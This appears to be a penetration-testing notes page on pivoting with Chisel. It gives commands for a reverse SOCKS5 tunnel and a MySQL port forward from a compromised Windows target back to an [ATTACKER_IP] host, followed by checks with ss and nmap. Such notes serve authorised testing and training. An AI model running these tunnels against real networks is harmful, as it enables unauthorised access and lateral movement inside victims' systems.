---
description: >-
  Example scenario for pivoting using Chisel. Note, this example assumes that
  the attacking system is Linux and the target system is Windows.
---

# Using Chisel to Pivot

### Setting up a SOCKS Proxy with Chisel

1. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)
   * Note, you will need one for your attacking system and one to be uploaded to the target system.
2. On the attacking system: `./chisel server --socks5 --reverse -p 8000`
3. On the target system: `.\chisel.exe client [ATTACKER_IP]:8000 R:socks`
4. Observe on the attacking system that the SOCKS5 connection has been successfully established.

### Forwarding One Port with Chise;

1. On the attacking system: `./chisel server 9000 -reverse`
2. On the target system: `.\chisel client [ATTACKER_IP]:9000 R:3306:127.0.0.1:3306`

### Verification

The easiest way to verify if your `Chisel` connection was successful is to run the following command: `ss -lnpt | grep 3306`

### Interaction

Ensure to remember that you will be interacting with `localhost` after forwarding a port. For example, by running `nmap -sC -sV -p3306 -n localhost`
